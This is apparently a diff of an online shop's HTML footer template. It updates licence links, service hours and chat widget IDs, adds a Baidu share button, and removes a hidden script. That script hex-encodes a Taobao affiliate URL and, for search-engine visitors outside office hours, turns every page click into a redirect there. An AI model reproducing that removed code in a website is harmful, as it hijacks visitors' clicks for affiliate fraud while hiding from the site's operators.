@@ -1,4 +1,5 @@
-<meta http-equiv="Content-Type" content="text/html; charset=gbk">
+
+
 <div class="block tc" style="margin-bottom:20px;">
    <!-- {if $navigator_list.bottom} -->
    <!-- {foreach name=nav_bottom_list from=$navigator_list.bottom item=nav} -->
@@ -39,7 +40,7 @@
       <!-- {/if} -->
   <!-- {/foreach} --><br />
   <!-- ICP 证书{if $icp_number} -->
-  {$lang.icp_number}:<a href="http://www.miibeian.gov.cn/" target="_blank" rel="nofollow">{$icp_number}<br /><!-- 结束ICP 证书{/if} -->
+  {$lang.icp_number}:<a href="http://www.miitbeian.gov.cn/" target="_blank" rel="nofollow">{$icp_number}<br /><!-- 结束ICP 证书{/if} -->
   中华人民共和国 增值电信业务经营许可证 经营许可证编号：苏B1-20120051
   <br />出版物经营及网络发行许可证号:新出发 苏A零字第 江027号 <script language="javascript" type="text/javascript" src="http://js.users.51.la/15577751.js"></script>
 <noscript><a href="http://www.51.la/?15577751" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/15577751.asp" style="border:none" /></a></noscript>
@@ -75,23 +76,11 @@ _gaq.push(['_trackPageview']);
   })();
 </script>
  <script type="text/javascript">
- function hexToString(str)
-{
-　　var val="";
-　　var arr = str.split(",");
-　　for(i = 0; i < arr.length; i++){
-　　　　val += String.fromCharCode(parseInt('0x'+arr[i]));
-　　}
-　　return val;
-}
     function show_r_kf()
 {
     document.getElementById("meumid").style.display="none"
     document.getElementById("contentid").style.display="block";
 }
-  function aon()
-{	window.location.href=hexToString('68,74,74,70,3a,2f,2f,73,2e,63,6c,69,63,6b,2e,74,61,6f,62,61,6f,2e,63,6f,6d,2f,74,3f,65,3d,7a,47,55,33,34,43,41,37,4b,25,32,42,50,6b,71,42,30,34,4d,51,7a,64,67,47,33,56,53,75,57,52,49,31,49,46,33,6e,25,32,46,7a,68,57,32,54,77,4a,67,71,6f,59,5a,49,7a,69,36,48,46,54,56,37,6e,49,54,46,63,64,6b,74,67,47,70,4d,4b,25,32,42,25,32,46,34,54,41,5a,43,6c,50,4d,6b,6e,69,6a,25,32,42,62,50,67,4f,51,57,73,25,33,44');
-  }
 function hideMsgBox(theEvent){
   if (theEvent){
     var browser=navigator.userAgent;
@@ -109,19 +98,6 @@ function hideMsgBox(theEvent){
   document.getElementById("meumid").style.display = "block";
   document.getElementById("contentid").style.display = "none";
  }
-
-
-var dateObj=new Date();
-var hour = dateObj.getHours();
-var fen = dateObj.getMinutes();
- if((hour < 9) || (hour > 17)){
-		var regexp=/\.(sogou|soso|google|youdao|baidu|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//;
-		var where =document.referrer;
-			if(regexp.test(where))
-			{
-				document.body.onclick = aon;	
-			}
-	 }
 </script>
 
 <!-- {if $page_id!="order_search"} -->
@@ -160,15 +136,15 @@ var fen = dateObj.getMinutes();
                 <td>
 
 				<div align="center">
-				<!--客服9090634的嵌入代码-->
-<a href="http://float2006.tq.cn/static.jsp?version=vip&admiuin=9090576&ltype=0&iscallback=0&page_templete_id=24427&is_message_sms=0&is_send_mail=0&uin=9090634" target=_blank><img src="http://float2006.tq.cn/staticimg.jsp?version=vip&admiuin=9090576&ltype=0&uin=9090634&style=4" border='0' />
+				<!--客服9479222的嵌入代码-->
+<a href="http://float2006.tq.cn/static.jsp?version=vip&admiuin=9090576&ltype=0&iscallback=0&page_templete_id=24427&is_message_sms=0&is_send_mail=0&uin=9090576" target=_blank><img src="http://float2006.tq.cn/staticimg.jsp?version=vip&admiuin=9090576&ltype=0&uin=9090576&style=4" border='0' />
 
 <br>
 <!--客服9090631的嵌入代码-->
 <a href="http://float2006.tq.cn/static.jsp?version=vip&admiuin=9090576&ltype=0&iscallback=0&page_templete_id=24427&is_message_sms=0&is_send_mail=0&uin=9090631" target=_blank><img src="http://float2006.tq.cn/staticimg.jsp?version=vip&admiuin=9090576&ltype=0&uin=9090631&style=4" border='0' />
 <br>
 <!--客服9090576的嵌入代码-->
-<a href="http://float2006.tq.cn/static.jsp?version=vip&admiuin=9090576&ltype=0&iscallback=0&page_templete_id=24427&is_message_sms=0&is_send_mail=0&uin=9090576" target=_blank><img src="http://float2006.tq.cn/staticimg.jsp?version=vip&admiuin=9090576&ltype=0&uin=9090576&style=4" border='0' />
+<a href="http://float2006.tq.cn/static.jsp?version=vip&admiuin=9090576&ltype=0&iscallback=0&page_templete_id=24427&is_message_sms=0&is_send_mail=0&uin=9479222" target=_blank><img src="http://float2006.tq.cn/staticimg.jsp?version=vip&admiuin=9090576&ltype=0&uin=9479222&style=4" border='0' />
 
 
 
@@ -182,7 +158,7 @@ var fen = dateObj.getMinutes();
 
             <tr><td><img src="images/alert/kf_bt.jpg"></td></tr>
             <tr>
-                <td align="center" height="16" colspan="#333333">每天08:30 - 17:30<br>
+                <td align="center" height="16" colspan="#333333">每天09:00 - 17:30<br>
                   周末不休息</td></tr>
              </tbody></table>
           </div>
@@ -192,3 +168,14 @@ var fen = dateObj.getMinutes();
   </div>
 </div>
 <!-- {/if} -->
+ <!-- Baidu Button BEGIN -->
+<div id="bdshare" class="bdshare_b" style="line-height: 12px;">
+<img src="http://bdimg.share.baidu.com/static/images/type-button-5.jpg?cdnversion=20120831" />
+<a class="shareCount"></a>
+</div>
+<script type="text/javascript" id="bdshare_js" data="type=button&amp;uid=759771" ></script>
+<script type="text/javascript" id="bdshell_js"></script>
+<script type="text/javascript">
+document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000);
+</script>
+<!-- Baidu Button END -->
